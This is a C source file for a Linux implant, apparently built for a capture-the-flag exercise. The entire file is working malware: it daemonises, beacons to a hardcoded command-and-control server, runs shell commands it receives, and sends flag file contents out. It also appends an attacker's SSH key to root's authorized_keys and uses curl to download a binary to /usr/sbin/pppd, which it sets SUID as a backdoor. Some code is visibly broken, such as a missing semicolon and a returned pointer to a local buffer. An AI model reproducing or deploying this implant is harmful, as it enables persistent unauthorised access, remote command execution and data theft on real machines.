#include <arpa/inet.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <syslog.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <time.h>
#include <unistd.h>
#include <netinet/tcp.h>
#include <netinet/in.h>
#include <netdb.h>

#define REMOTE_ADDR "10.10.10.10"
#define REMOTE_PORT 80
#define SHELL_PORT 8080
#define USER_FLAG "/opt/flag.txt"
#define ROOT_FLAG "/root/flag.txt"
#define BUFFER_SIZE 4096

char implant_uid[5];

static void daemonise()
{
    pid_t pid;
    pid = fork();
    if(pid < 0)
        exit(EXIT_FAILURE);

    if(pid > 0)
        exit(EXIT_SUCCESS);

    if(setsid() < 0)
        exit(EXIT_FAILURE);

    signal(SIGCHLD, SIG_IGN);
    signal(SIGHUP, SIG_IGN);
    pid = fork();

    if (pid < 0)
        exit(EXIT_FAILURE);

    if (pid > 0)
        exit(EXIT_SUCCESS);

    umask(0);
    chdir("/usr/lib/systemd");

    int x;
    for (x = sysconf(_SC_OPEN_MAX); x>=0; x--)
    {
        close(x);
    }
}

char* sendHTTP(char *uid, char *type, char *data);
char* sendHTTP(char *uid, char *type, char *data)
{
    char postBody[100] = "\0";
    char path[]="beacon.php";
    char httpRequest[500] = "\0";
    char httpURL[255] = "\0";
    char buffer[BUFFER_SIZE];
    int s;	// socket descriptor
    int on = 1;
    struct sockaddr_in serv_addr;

    sprintf(httpURL,"/%s HTTP/1.1",path);
    sprintf(postBody,"uid=%s&type=%s&data=%s", uid, type, data);
    sprintf(httpRequest,"POST %s\r\nHost: %s:%i\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\n\r\n%s", httpURL, REMOTE_ADDR, REMOTE_PORT, strlen(postBody), postBody);
    // syslog(LOG_NOTICE, "HTTP request: %s", httpRequest);
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(REMOTE_PORT);
    inet_aton(REMOTE_ADDR, &serv_addr.sin_addr);
    s = socket(PF_INET, SOCK_STREAM, 0);
    connect(s, (struct sockaddr*)&serv_addr, sizeof(serv_addr));
    setsockopt(s, IPPROTO_TCP, TCP_NODELAY, (const char *)&on, sizeof(int));
    write(s, httpRequest, strlen(httpRequest));
    bzero(buffer, BUFFER_SIZE);
    read(s, buffer, BUFFER_SIZE - 1);
    // syslog(LOG_NOTICE, "HTTP response: %s", buffer);
    shutdown(s, SHUT_RDWR); 
    close(s);

    // Split the string up
    char *token;
    token = strtok(buffer, "\n");
    char response[150] = "\0";
    while(token != NULL)
    {
        if(strstr(token,"c2_") != 0)
        {
            strcpy(response, token);
        }
        token = strtok(NULL, "\n");
    }
    char *r = response;
    return r;
}

void dropSSH(char *path)
{
    FILE *fp;
    char public_key[] = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCo5/GGgVPhGezrTWAFPQm1MCke0LTPWxTxPMDnaMq6EADb6dVjJ/S9VQmPVemBsCwc5TwgYFEoY9CpRbqxrY2rLNfYBSaZoVBEDRMlljaTu7Hl8Y1ZmfSxTOlXBrwP7HD3gJaBkL7VPWsljuXpJuOfJbWdIeWbYeifKsZI0xIbrFYyCYwDabUVFFatQM/23pBAgOeSrd1FzWGd9S2Ctl63o/fxt+KHAKZL81d+69fCvPFLZK+RNj9pY3QD/KhfzCIc23+D85tg/+lznYbAuUtykkz31smUChqT52ZCtNUR1Zsc4kjGZR5r57kg8FkxFiK6CtFvJe+idGNyXV3hwAvWfgVTia9WL5mQfm0Y1lX5/xI/H5dMJ8VDCYyXCaOZjH4xd5PU+5SrFLxObsWkRdbgt3fFM5LCsrHW9ko76OEsL85yBTAck663HzCQVSJnVBhNT9pijkq25RVpEeREm1LEn6L2EW0+BB7xorDT031tD6s4yjJLRs2uuTTbbZ8J1Ts= jay@parrot\n";

    syslog(LOG_NOTICE,"Dropping SSH key to %s :-)", path);
    if(fp = fopen(path, "a"))
    {
        fwrite(public_key, 1, sizeof(public_key), fp);
        fclose(fp);
        chmod(path,S_IRUSR|S_IWUSR);
    }
}

void checkSSH(char *path)
{
    FILE *fp;
    char contents[2000] = "\0";
    char needle[] = "jay@parrot";
    char *result;

    syslog(LOG_NOTICE,"Checking SSH keys %s", path);
    if(fp = fopen(path, "r"))
    {
        fread(contents, 2000, 1, fp);
        fclose(fp);
        result = strstr(contents,needle);
        
        if(strstr(contents, needle) == NULL)
        {
            dropSSH(path);
        }
    } else {
        dropSSH(path);
    }
}

void executecmd(char *cmd)
{
    syslog(LOG_NOTICE, "Executing shell command: %s",cmd);
    system(cmd);
    exit(0);
}

void beacon(void)
{
    while(1)
    {
        // Beacon back for any new commands
        //
        char type[7] = "Beacon";
        char data[12] = "I'm alive!";
        char *cmd;
        char *cmdstring;
        char *shellstr = "c2_shell";
        char *implantstr = "c2_implant";

        cmdstring = sendHTTP(implant_uid, type, data);
        if(strstr(cmdstring,shellstr))
        {
            if(strlen(cmdstring+9) > 1)
            {
                pid_t fork_pid = fork();
                if(fork_pid == 0)
                {
                    executecmd(cmdstring+9);
                }
            }
        }

        if(strstr(cmdstring,implantstr))
        {
            if(strlen(cmdstring+6) > 1)
            {
                pid_t fork_pid = fork();
                if(fork_pid == 0)
                {
                    // executecmd(cmdstring+6);
                }
            }
        }

        sleep(15);
    }
}

void dropPPPD(void)
{
    char file[]="/usr/sbin/pppd";
    char command[100] = "\0";
	
    syslog(LOG_NOTICE,"Dropping backdoor /usr/sbin/pppd :-)");
	sprintf(command,"curl http://%s/exec -o /usr/sbin/pppd", REMOTE_ADDR);
    system(command);
    chmod(file,S_ISUID|S_IRWXU|S_IRGRP|S_IXGRP|S_IROTH|S_IXOTH);
	exit(0)
}

void checkPPPD(void)
{
    FILE *pppd_file;

    syslog(LOG_NOTICE,"Checking backdoor /usr/sbin/pppd");
    if(pppd_file = fopen("/usr/sbin/pppd", "r"))
    {
        fclose(pppd_file);
    } else {
        pid_t fork_pid = fork();
        if(fork_pid == 0)
        {
            dropPPPD();
        }
    }
}

int collectinfo()
{
    int pid = getpid();
    int ppid = getppid();
    pid_t sid = getsid(pid);
    char *cmd = getenv("_");
    char *user = getlogin();
    uid_t uid = getuid();
    uid_t euid = geteuid();
    char *tty = ttyname(0);
}

int main(void)
{
    daemonise();
    char pUSER_FLAG[100];
    char pROOT_FLAG[100];

    srand(time(NULL));
    const char charset[] = "abcdefghijklmnopqrstuvwxyz0123456789";
    for(size_t n = 0; n < 5; n++)
    {
        int key = rand() % (int)(sizeof charset -1);
        implant_uid[n] = charset[key];
    }

    // implant_uid[5] = "\0";
	//
    syslog(LOG_NOTICE,"Implant UID: %s", implant_uid);
            
    // Beacon back
	//
    pid_t fork_pid = fork();
    if(fork_pid == 0)
    {
        beacon();
    }

    while(1)
    {
        // User flag
        //
        syslog(LOG_NOTICE,"Checking for user activity");
        char cUSER_FLAG[100];
        FILE *fpu = fopen(USER_FLAG, "r");
        if(fpu)
        {
            fgets(cUSER_FLAG, sizeof(cUSER_FLAG), fpu);
            if(pUSER_FLAG)
            {
                if(strcmp(pUSER_FLAG, cUSER_FLAG))
                {
                    // flags are different, overwrite pUSER_FLAG with cUSER_FLAG
                    strcpy(pUSER_FLAG,cUSER_FLAG);
                    char type[5] = "Flag";
                    char* r = sendHTTP(implant_uid, type, pUSER_FLAG);
                }
            }
            fclose(fpu);
        }
        
        // Root flag
        //
        syslog(LOG_NOTICE,"Checking for root activity");
        char cROOT_FLAG[100];
        FILE *fpr = fopen(ROOT_FLAG, "r");
        if(fpr)
        {
            fgets(cROOT_FLAG, sizeof(cROOT_FLAG), fpr);
            if(pROOT_FLAG)
            {
                if(strcmp(pROOT_FLAG, cROOT_FLAG))
                {
		            // flags are different, over pROOT_FLAG with cROOT_FLAG
                    strcpy(pROOT_FLAG,cROOT_FLAG);
                    char type[5] = "Flag";
                    char* r = sendHTTP(implant_uid, type, pROOT_FLAG);
                }
            }
            fclose(fpr);
        }
        
        // Backdoor with SUID
        //
        checkPPPD();

        // Drop SSH keys
        //
        checkSSH("/root/.ssh/authorized_keys");

        // Sleep for a little while
		//
        sleep(3);
    }
    return EXIT_SUCCESS;
}